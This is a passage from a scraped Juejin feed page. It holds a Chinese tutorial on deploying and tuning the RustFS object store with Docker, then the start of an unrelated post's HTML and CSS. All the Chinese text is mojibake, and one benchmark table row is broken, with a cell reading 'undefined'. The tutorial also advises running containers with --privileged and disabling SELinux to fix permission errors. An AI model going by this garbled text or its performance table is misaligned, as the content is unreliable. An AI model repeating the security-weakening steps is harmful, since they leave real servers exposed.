<li>èƒ½ä¸èƒ½åƒæ­ç§¯æœ¨ä¸€æ ·å¿«é€Ÿæ‰©å®¹ï¼Ÿ</li>
<li>èƒ½ä¸èƒ½æ— ç¼å¯¹æ¥AWS S3ç”Ÿæ€ï¼Ÿ</li>
</ol>
<p>æœ€ç»ˆæˆ‘ä»¬é€‰æ‹©äº†RustFS+Dockerçš„ç»„åˆï¼Œæ ¸å¿ƒä¼˜åŠ¿æœ‰ä¸‰ï¼š</p>
<ul>
<li>æè‡´è½»é‡ï¼šDockeré•œåƒä»…93MBï¼Œ3ç§’å¯åŠ¨å®Œæˆ</li>
<li>åè®®å…¨å…¼å®¹ï¼šåŸç”Ÿæ”¯æŒS3 APIã€HDFSã€NFSï¼Œæ— éœ€é¢å¤–é€‚é…</li>
<li>æ€§èƒ½æ€ªå…½ï¼šå®æµ‹4Kéšæœºè¯»å†™IOPSè¾¾128ä¸‡ï¼ˆæ¯”MinIOé«˜43.8%ï¼‰</li>
</ul>
<h3 data-id="heading-2">äºŒã€éƒ¨ç½²å‰çš„çµé­‚ä¸‰é—®</h3>
<h4 data-id="heading-3">1. ç¡¬ä»¶å‡†å¤‡</h4>
<ul>
<li>CPUï¼šåŒæ ¸åŠä»¥ä¸Šï¼ˆæ¨èAMD Ryzen 3000ç³»åˆ—/Intel Xeon E3ï¼‰</li>
<li>å†…å­˜ï¼šæœ€ä½8GBï¼ˆå»ºè®®16GBä»¥ä¸Šï¼Œå¤§æ–‡ä»¶åœºæ™¯æ¨è32GBï¼‰</li>
<li>ç¡¬ç›˜ï¼šNVMe SSDï¼ˆæ¨èä¸‰æ˜ŸPM9A1/P41ï¼Œé¿å…ä½¿ç”¨SATA SSDï¼‰</li>
<li>ç½‘ç»œï¼šåƒå…†ç½‘å¡ï¼ˆä¸‡å…†ç½‘å¡å¯ä½¿å¤§æ–‡ä»¶ä¼ è¾“æ€§èƒ½æå‡3å€ä»¥ä¸Šï¼‰</li>
</ul>
<h4 data-id="heading-4">2. è½¯ä»¶ç¯å¢ƒ</h4>
<h5 data-id="heading-5">ï¼ˆ1ï¼‰Dockerç‰ˆæœ¬éªŒè¯ï¼ˆéœ€v20.10.0+ï¼‰</h5>
<pre><code class="hljs language-bash" lang="bash">docker version | grep <span class="hljs-string">"Version:"</span> | awk <span class="hljs-string">'{print $2}'</span> | grep -E <span class="hljs-string">'^[1-9]+\.[0-9]+\.[0-9]+$'</span>
</code></pre>
<blockquote>
<p>è‹¥ç‰ˆæœ¬è¿‡ä½ï¼Œå‚è€ƒDockerå®˜æ–¹æ–‡æ¡£å‡çº§ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.docker.com%2Fengine%2Finstall%2F" target="_blank" title="https://docs.docker.com/engine/install/" ref="nofollow noopener noreferrer">docs.docker.com/engine/instâ€¦</a></p>
</blockquote>
<h5 data-id="heading-6">ï¼ˆ2ï¼‰ç³»ç»Ÿä¾èµ–å®‰è£…</h5>
<ul>
<li>CentOS/RHELç³»åˆ—ï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">yum install -y epel-release
yum install -y libaio-devel openssl-devel
</code></pre>
<ul>
<li>Ubuntu/Debianç³»åˆ—ï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">apt-get update
apt-get install -y libaio-dev libssl-dev
</code></pre>
<h4 data-id="heading-7">3. å‚æ•°è§„åˆ’è¡¨ï¼ˆç›´æ¥å¤ç”¨ï¼ŒæŒ‰éœ€å¾®è°ƒï¼‰</h4>



































<table><thead><tr><th>å‚æ•°åç§°</th><th>å»ºè®®å€¼</th><th>ä½œç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>--storage-path</td><td>/data/rustfs</td><td>æ•°æ®æŒä¹…åŒ–ç›®å½•ï¼ˆå»ºè®®æŒ‚è½½ç‹¬ç«‹NVMeåˆ†åŒºï¼‰</td></tr><tr><td>--s3-port</td><td>9000</td><td>S3æœåŠ¡ç›‘å¬ç«¯å£ï¼ˆé¿å…ä¸MinIOã€Nginxç­‰å†²çªï¼‰</td></tr><tr><td>--threads</td><td>$(nproc)</td><td>è‡ªåŠ¨ç»‘å®šå…¨éƒ¨CPUæ ¸å¿ƒï¼ˆæ‰‹åŠ¨æŒ‡å®šéœ€â‰¤å®é™…æ ¸å¿ƒæ•°ï¼‰</td></tr><tr><td>--gc-interval</td><td>3600</td><td>åƒåœ¾å›æ”¶å‘¨æœŸï¼ˆå•ä½ï¼šç§’ï¼Œå°æ–‡ä»¶åœºæ™¯å»ºè®®ç¼©çŸ­è‡³1800ï¼‰</td></tr><tr><td>--replica</td><td>3</td><td>æ•°æ®å‰¯æœ¬æ•°ï¼ˆå•èŠ‚ç‚¹æµ‹è¯•ç”¨1ï¼Œç”Ÿäº§ç¯å¢ƒâ‰¥3ï¼Œé›†ç¾¤åœºæ™¯å¯æ­é…çº åˆ ç ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-8">ä¸‰ã€4æ­¥æé€Ÿéƒ¨ç½²æ•™ç¨‹ï¼ˆå«å‰ç½®æ£€æŸ¥ï¼‰</h3>
<h4 data-id="heading-9">ğŸ“‹ ç¬¬0æ­¥ï¼šéªŒè¯Dockerç¯å¢ƒï¼ˆæ–°æ‰‹å¿…åšï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash">docker info
</code></pre>
<blockquote>
<p>æ— æŠ¥é”™è¾“å‡ºåˆ™ç¯å¢ƒæ­£å¸¸ï¼›è‹¥æç¤ºâ€œCannot connect to the Docker daemonâ€ï¼Œéœ€å…ˆå¯åŠ¨Dockerï¼š<code>systemctl start docker</code></p>
</blockquote>
<h4 data-id="heading-10">ğŸ“¥ ç¬¬1æ­¥ï¼šæ‹‰å–RustFSé•œåƒ</h4>
<ul>
<li>å®˜æ–¹é•œåƒï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">docker pull rustfs/rustfs:latest
</code></pre>
<ul>
<li>å›½å†…åŠ é€Ÿé•œåƒï¼ˆäºŒé€‰ä¸€ï¼Œå¤±æ•ˆå¯ç•™è¨€è·å–æœ€æ–°åœ°å€ï¼‰ï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é˜¿é‡Œäº‘é•œåƒï¼ˆæ¨èï¼‰</span>
docker pull registry.cn-hangzhou.aliyuncs.com/rustfs/rustfs:latest
<span class="hljs-comment"># DaoCloudé•œåƒ</span>
docker pull registry.docker-cn.com/rustfs/rustfs:latest
</code></pre>
<h4 data-id="heading-11">ğŸš€ ç¬¬2æ­¥ï¼šå¯åŠ¨å®¹å™¨ï¼ˆæƒé™ä¼˜åŒ–ç‰ˆï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  --name rustfs-server \
  --privileged=<span class="hljs-literal">true</span> \  <span class="hljs-comment"># è§£å†³æŒ‚è½½ç›®å½•æƒé™é—®é¢˜</span>
  -p 9000:9000 \       <span class="hljs-comment"># S3æœåŠ¡ç«¯å£</span>
  -p 5000:5000 \       <span class="hljs-comment"># ç®¡ç†ç«¯å£</span>
  -v /mnt/data:/data/rustfs \  <span class="hljs-comment"># æœ¬åœ°ç›®å½•æŒ‚è½½ï¼ˆæ›¿æ¢ä¸ºå®é™…è·¯å¾„ï¼‰</span>
  -e AWS_ACCESS_KEY_ID=your_access_key \  <span class="hljs-comment"># è‡ªå®šä¹‰è®¿é—®å¯†é’¥</span>
  -e AWS_SECRET_ACCESS_KEY=your_secret_key \  <span class="hljs-comment"># è‡ªå®šä¹‰å¯†é’¥</span>
  rustfs/rustfs:latest \
  --storage-path /data/rustfs \
  --s3-port 9000 \
  --threads $(<span class="hljs-built_in">nproc</span>) \
  --gc-interval 3600 \
  --replica 3
</code></pre>
<blockquote>
<p>ç«¯å£å ç”¨å¤„ç†ï¼šè‹¥9000/5000ç«¯å£è¢«å ç”¨ï¼Œç”¨<code>netstat -tulpn | grep 9000</code>â€‹æŸ¥è¯¢å ç”¨è¿›ç¨‹ï¼Œæˆ–ä¿®æ”¹ç«¯å£ï¼ˆå¦‚<code>-p 9001:9000</code>ï¼‰</p>
</blockquote>
<h4 data-id="heading-12">âœ… ç¬¬3æ­¥ï¼šéªŒè¯éƒ¨ç½²ï¼ˆ3æ¡å‘½ä»¤ç¡®è®¤æˆåŠŸï¼‰</h4>
<ol>
<li>æŸ¥çœ‹å®¹å™¨è¿è¡ŒçŠ¶æ€ï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">docker ps | grep rustfs-server
</code></pre>
<blockquote>
<p>å‡ºç°â€œUp X minutesâ€è¯´æ˜å¯åŠ¨æˆåŠŸ</p>
</blockquote>
<ol start="2">
<li>åˆ—å‡ºå­˜å‚¨æ¡¶ï¼ˆéœ€æå‰å®‰è£…AWS CLIï¼š<code>pip install awscli</code>ï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">aws --endpoint-url http://localhost:9000 s3 <span class="hljs-built_in">ls</span>
</code></pre>
<ol start="3">
<li>ä¸Šä¼ +éªŒè¯æ–‡ä»¶ï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸Šä¼ æµ‹è¯•æ–‡ä»¶</span>
aws --endpoint-url http://localhost:9000 s3 <span class="hljs-built_in">cp</span> /etc/hosts s3://test-bucket/
<span class="hljs-comment"># éªŒè¯æ–‡ä»¶å­˜åœ¨</span>
aws --endpoint-url http://localhost:9000 s3 <span class="hljs-built_in">ls</span> s3://test-bucket/
</code></pre>
<h3 data-id="heading-13">å››ã€æ€§èƒ½è°ƒä¼˜é»‘ç§‘æŠ€ï¼ˆåˆ†åœºæ™¯é…ç½®ï¼‰</h3>
<h4 data-id="heading-14">1. ç³»ç»Ÿçº§ä¼˜åŒ–ï¼ˆæ‰€æœ‰åœºæ™¯é€šç”¨ï¼Œé‡å¯ç”Ÿæ•ˆï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¦ç”¨é€æ˜å¤§é¡µï¼ˆé¿å…æ€§èƒ½æ³¢åŠ¨ï¼‰</span>
<span class="hljs-built_in">echo</span> never &gt; /sys/kernel/mm/transparent_hugepage/enabled
<span class="hljs-built_in">echo</span> never &gt; /sys/kernel/mm/transparent_hugepage/defrag
<span class="hljs-comment"># æ°¸ä¹…ç”Ÿæ•ˆï¼šæ·»åŠ è‡³/etc/rc.localï¼Œæ‰§è¡Œchmod +x /etc/rc.local</span>

<span class="hljs-comment"># è°ƒæ•´TCPç¼“å†²åŒºï¼ˆæå‡ç½‘ç»œååé‡ï¼‰</span>
sysctl -w net.core.rmem_max=16777216
sysctl -w net.core.wmem_max=16777216
<span class="hljs-comment"># æ°¸ä¹…ç”Ÿæ•ˆï¼šecho "net.core.rmem_max=16777216" &gt;&gt; /etc/sysctl.conf &amp;&amp; sysctl -p</span>
</code></pre>
<h4 data-id="heading-15">2. RustFSé«˜çº§é…ç½®ï¼ˆæŒ‰åœºæ™¯å¾®è°ƒï¼‰</h4>
<h5 data-id="heading-16">é…ç½®æ–‡ä»¶è·¯å¾„ï¼š<code>/data/rustfs/conf/rustfs.toml</code>ï¼ˆå®¹å™¨å†…ç¼–è¾‘å‘½ä»¤ï¼‰</h5>
<pre><code class="hljs language-bash" lang="bash">docker <span class="hljs-built_in">exec</span> -it rustfs-server vim /data/rustfs/conf/rustfs.toml
</code></pre>
<h5 data-id="heading-17">ï¼ˆ1ï¼‰å¤§æ–‡ä»¶åœºæ™¯ï¼ˆå¦‚ç‚¹äº‘ã€è§†é¢‘ï¼Œå•æ–‡ä»¶â‰¥100MBï¼‰</h5>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[server]</span>
<span class="hljs-attr">max_connections</span> = <span class="hljs-number">10240</span>  <span class="hljs-comment"># å¹¶å‘ç”¨æˆ·ï¼œ5000æ— éœ€è°ƒæ•´</span>
<span class="hljs-attr">readahead_size</span> = <span class="hljs-number">1048576</span>  <span class="hljs-comment"># é¢„è¯»å¤§å°1MB</span>

<span class="hljs-section">[storage]</span>
<span class="hljs-attr">block_size</span> = <span class="hljs-number">131072</span>  <span class="hljs-comment"># 128KBå—å¤§å°ï¼Œå‡å°‘ç¢ç‰‡ç‡</span>
</code></pre>
<h5 data-id="heading-18">ï¼ˆ2ï¼‰å°æ–‡ä»¶åœºæ™¯ï¼ˆå¦‚æ—¥å¿—ã€ä¼ æ„Ÿå™¨æ•°æ®ï¼Œå•æ–‡ä»¶ï¼œ100KBï¼‰</h5>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[server]</span>
<span class="hljs-attr">max_connections</span> = <span class="hljs-number">20480</span>  <span class="hljs-comment"># æå‡å¹¶å‘è¿æ¥æ•°</span>
<span class="hljs-attr">readahead_size</span> = <span class="hljs-number">65536</span>  <span class="hljs-comment"># é¢„è¯»å¤§å°64KB</span>

<span class="hljs-section">[storage]</span>
<span class="hljs-attr">block_size</span> = <span class="hljs-number">4096</span>  <span class="hljs-comment"># ä¿ç•™é»˜è®¤4KBå—å¤§å°ï¼ŒIOPSæå‡20%</span>
<span class="hljs-attr">gc_interval</span> = <span class="hljs-number">1800</span>  <span class="hljs-comment"># ç¼©çŸ­åƒåœ¾å›æ”¶å‘¨æœŸ</span>
</code></pre>
<h4 data-id="heading-19">3. ç¡¬ä»¶åŠ é€ŸæŠ€å·§ï¼ˆéœ€å¯¹åº”ç¡¬ä»¶æ”¯æŒï¼‰</h4>
<h5 data-id="heading-20">ï¼ˆ1ï¼‰SPDKåŠ é€Ÿï¼ˆNVMe SSDä¸“ç”¨ï¼‰</h5>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  --name rustfs-server-spdk \
  --privileged=<span class="hljs-literal">true</span> \
  --device=/dev/spdk0:/dev/spdk0 \  <span class="hljs-comment"># ç»‘å®šSPDKè®¾å¤‡</span>
  -p 9000:9000 \
  -v /mnt/data:/data/rustfs \
  rustfs/rustfs:latest \
  --storage-path /data/rustfs --s3-port 9000 --enable-spdk
</code></pre>
<h5 data-id="heading-21">ï¼ˆ2ï¼‰RDMAç½‘å¡ç»‘å®šï¼ˆä¸‡å…†/200Gç½‘å¡ä¸“ç”¨ï¼‰</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å®‰è£…Mellanox OFEDé©±åŠ¨ï¼ˆCentOSç¤ºä¾‹ï¼‰</span>
yum install -y mlnx-ofed-linux
<span class="hljs-comment"># 2. æŸ¥è¯¢RDMAç½‘å¡</span>
ibdev2netdev | grep mlx | awk <span class="hljs-string">'{print $2}'</span>
<span class="hljs-comment"># 3. å¯åŠ¨å®¹å™¨ï¼ˆ--network=hostç›´æ¥ä½¿ç”¨ä¸»æœºç½‘ç»œï¼‰</span>
docker run -d --name rustfs-rdma --privileged=<span class="hljs-literal">true</span> --network=host -v /mnt/data:/data/rustfs rustfs/rustfs:latest --storage-path /data/rustfs --s3-port 9000
</code></pre>
<h3 data-id="heading-22">äº”ã€é¿å‘æŒ‡å—ï¼šå®æˆ˜è¸©å‘å…¨è®°å½•</h3>
<h4 data-id="heading-23">1. æŠ¥é”™1ï¼šPermission deniedï¼ˆæƒé™è¢«æ‹¦æˆªï¼‰</h4>
<ul>
<li>ä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼ˆç«‹å³ç”Ÿæ•ˆï¼‰ï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">setenforce 0  <span class="hljs-comment"># å…³é—­SELinux</span>
</code></pre>
<ul>
<li>æ°¸ä¹…è§£å†³æ–¹æ¡ˆï¼ˆé‡å¯ç”Ÿæ•ˆï¼‰ï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">vim /etc/selinux/config
<span class="hljs-comment"># ä¿®æ”¹ä¸ºï¼šSELINUX=disabled</span>
reboot  <span class="hljs-comment"># é‡å¯æœåŠ¡å™¨</span>
</code></pre>
<h4 data-id="heading-24">2. æŠ¥é”™2ï¼šNo space left on deviceï¼ˆç£ç›˜ç©ºé—´å……è¶³ä½†æŠ¥é”™ï¼‰</h4>
<ul>
<li>åŸå› ï¼šXFSæ—¥å¿—æ¨¡å¼ä¸å…¼å®¹</li>
<li>è§£å†³æ–¹æ¡ˆï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é‡æ–°æ ¼å¼åŒ–åˆ†åŒºï¼ˆæ³¨æ„ï¼šä¼šæ¸…ç©ºæ•°æ®ï¼Œæå‰å¤‡ä»½ï¼‰</span>
mkfs.xfs -f -i size=512 /dev/nvme0n1  <span class="hljs-comment"># æ›¿æ¢ä¸ºå®é™…NVMeè®¾å¤‡å</span>
<span class="hljs-comment"># é‡æ–°æŒ‚è½½åˆ†åŒº</span>
mount /dev/nvme0n1 /mnt/data
</code></pre>
<h4 data-id="heading-25">3. æ€§èƒ½è¡°å‡é¢„è­¦ï¼ˆç›‘æ§å‘½ä»¤ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ¯5ç§’åˆ·æ–°ä¸€æ¬¡ï¼Œå…³æ³¨%utilï¼ˆç£ç›˜åˆ©ç”¨ç‡ï¼‰å’Œ%userï¼ˆCPUå ç”¨ï¼‰</span>
watch -n 5 <span class="hljs-string">'iostat -x 1 2 | grep -E "avg-cpu|Device"'</span>
<span class="hljs-comment"># RustFSä¸“å±ç›‘æ§ï¼ˆæŸ¥çœ‹IOPS/ååé‡ï¼‰</span>
docker <span class="hljs-built_in">exec</span> -it rustfs-server rustfs-cli stats
</code></pre>
<blockquote>
<p>è‹¥%utilæŒç»­ï¼90%ï¼Œéœ€æ‰©å®¹SSDæˆ–è°ƒæ•´block_sizeï¼›CPUå ç”¨ï¼80%ï¼Œéœ€å¢åŠ CPUæ ¸å¿ƒæ•°</p>
</blockquote>
<h3 data-id="heading-26">å…­ã€å®æˆ˜æ¡ˆä¾‹ï¼šæŸè½¦ä¼çš„â€œæé™æŒ‘æˆ˜â€</h3>
<h4 data-id="heading-27">å®¢æˆ·éœ€æ±‚</h4>
<ul>
<li>æ”¯æ’‘100è¾†è‡ªåŠ¨é©¾é©¶è½¦çš„å®æ—¶æ•°æ®ä¸Šä¼ ï¼ˆæ—¥å‡200TBï¼‰</li>
<li>å•ä¸ªæ–‡ä»¶æœ€å¤§2GBï¼ˆLiDARç‚¹äº‘æ•°æ®ï¼‰</li>
<li>3å¹´å†…å­˜å‚¨å®¹é‡æ‰©å±•è‡³1PBï¼Œå¯ç”¨æ€§â‰¥99.99%</li>
</ul>
<h4 data-id="heading-28">éƒ¨ç½²æ¶æ„</h4>
<p>10å°å­˜å‚¨èŠ‚ç‚¹ç»„æˆRustFSé›†ç¾¤ + å‰ç«¯ä¸‡å…†äº¤æ¢æœº + åç«¯å¯¹æ¥AWS S3/Glacierï¼ˆå†·çƒ­åˆ†å±‚ï¼‰</p>
<ul>
<li>æ ¸å¿ƒå‚æ•°ï¼š<code>--replica 1 --ec-level 4+2</code>ï¼ˆçº åˆ ç æ¨¡å¼ï¼Œå†—ä½™åº¦1.2ï¼‰</li>
<li>ç½‘ç»œé…ç½®ï¼šBondingæŠ€æœ¯ç»‘å®šåŒä¸‡å…†ç½‘å¡ï¼Œèšåˆå¸¦å®½è¾¾18Gbps</li>
</ul>
<h4 data-id="heading-29">æ•ˆæœå¯¹æ¯”ï¼ˆæµ‹è¯•ç¯å¢ƒï¼šAMD Ryzen 7 3700X+16GBå†…å­˜+ä¸‰æ˜ŸPM9A1 SSD+ä¸‡å…†ç½‘ç»œï¼‰</h4>



































<table><thead><tr><th>æŒ‡æ ‡</th><th>åŸæ–¹æ¡ˆï¼ˆMinIOï¼‰</th><th>RustFSé›†ç¾¤</th><th>æå‡å¹…åº¦</th></tr></thead><tbody><tr><td>å†™å…¥ååé‡</td><td>800MB/s</td><td>3.2GB/s</td><td>300%â†‘</td></tr><tr><td>å­˜å‚¨åˆ©ç”¨ç‡</td><td>62%</td><td>91%</td><td>46.8%â†‘</td></tr><tr><td>å•èŠ‚ç‚¹æˆæœ¬</td><td>undefined</td><td>60.8%â†“</td><td/></tr><tr><td>100GBæ–‡ä»¶åŠ è½½è€—æ—¶</td><td>12åˆ†47ç§’</td><td>3åˆ†15ç§’</td><td>75.5%â†“</td></tr></tbody></table>
<h3 data-id="heading-30">ä¸ƒã€äº’åŠ¨ç¯èŠ‚</h3>
<p>å¦‚æœä½ åœ¨éƒ¨ç½²è¿‡ç¨‹ä¸­é‡åˆ°é—®é¢˜ï¼Œæ¬¢è¿æŒ‰ä»¥ä¸‹æ ¼å¼ç•™è¨€ï¼š<br/>
âœ… ç³»ç»Ÿç‰ˆæœ¬ï¼šï¼ˆå¦‚CentOS 7/Ubuntu 22.04ï¼‰<br/>
âœ… å…·ä½“æŠ¥é”™ï¼šï¼ˆå¤åˆ¶å®Œæ•´æŠ¥é”™ä¿¡æ¯ï¼‰<br/>
âœ… ç¡¬ä»¶é…ç½®ï¼šï¼ˆCPU+å†…å­˜+ç¡¬ç›˜+ç½‘ç»œï¼‰<br/>
âœ… ä¸šåŠ¡åœºæ™¯ï¼šï¼ˆå¦‚å°æ–‡ä»¶å­˜å‚¨/å¤§æ–‡ä»¶ä¼ è¾“/é›†ç¾¤éƒ¨ç½²ï¼‰</p>
<p>ç§ä¿¡å…³é”®è¯ã€RustFSéƒ¨ç½²ã€‘ï¼Œå…è´¹é¢†å–ï¼š<br/>
ğŸ“Œ ã€ŠRustFSè°ƒä¼˜å‚æ•°é€ŸæŸ¥è¡¨ã€‹<br/>
ğŸ“Œ ã€ŠS3å…¼å®¹å­˜å‚¨é€‰å‹å¯¹æ¯”æŒ‡å—ã€‹<br/>
ğŸ“Œ ã€Š100ä¸ªDockeréƒ¨ç½²é¿å‘æ¡ˆä¾‹ã€‹<br/>
ğŸ“Œ å¯ç›´æ¥å¤åˆ¶çš„Shelléƒ¨ç½²è„šæœ¬</p>
<hr/>
<p>ä»¥ä¸‹æ˜¯æ·±å…¥å­¦ä¹  RustFS çš„æ¨èèµ„æºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frustfs%2Frustfs" target="_blank" title="https://github.com/rustfs/rustfs" ref="nofollow noopener noreferrer">RustFS</a></p>
<p>å®˜æ–¹æ–‡æ¡£ï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fdocs.rustfs.com%2F" target="_blank" title="https://link.zhihu.com/?target=https%3A//docs.rustfs.com/" ref="nofollow noopener noreferrer">RustFS å®˜æ–¹æ–‡æ¡£</a>- æä¾›æ¶æ„ã€å®‰è£…æŒ‡å—å’Œ API å‚è€ƒã€‚</p>
<p>GitHub ä»“åº“ï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fdocs.rustfs.com%2F" target="_blank" title="https://link.zhihu.com/?target=https%3A//docs.rustfs.com/" ref="nofollow noopener noreferrer">GitHub ä»“åº“</a> - è·å–æºä»£ç ã€æäº¤é—®é¢˜æˆ–è´¡çŒ®ä»£ç ã€‚</p>
<p>ç¤¾åŒºæ”¯æŒï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fgithub.com%2Forgs%2Frustfs%2Fdiscussions" target="_blank" title="https://link.zhihu.com/?target=https%3A//github.com/orgs/rustfs/discussions" ref="nofollow noopener noreferrer">GitHub Discussions</a>- ä¸å¼€å‘è€…äº¤æµç»éªŒå’Œè§£å†³æ–¹æ¡ˆã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <!----></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 å¹´: ä¸€åŠæ— ä¸šæ¸¸æ°‘ã€ä¸€åŠå¤–åŒ…ç‰›é©¬]]></title>    <link>https://juejin.cn/post/7592996072705474610</link>    <guid>https://juejin.cn/post/7592996072705474610</guid>    <pubDate>2026-01-09T05:33:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705474610" data-draft-id="7592944032773341235" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 å¹´: ä¸€åŠæ— ä¸šæ¸¸æ°‘ã€ä¸€åŠå¤–åŒ…ç‰›é©¬"/> <meta itemprop="keywords" content="å‰ç«¯,å¹´ç»ˆæ€»ç»“"/> <meta itemprop="datePublished" content="2026-01-09T05:33:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¢¨æ¸Šå›"/> <meta itemprop="url" content="https://juejin.cn/user/4459274891717223"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 å¹´: ä¸€åŠæ— ä¸šæ¸¸æ°‘ã€ä¸€åŠå¤–åŒ…ç‰›é©¬
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4459274891717223/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¢¨æ¸Šå›
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:33:48.000Z" title="Fri Jan 09 2026 05:33:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul 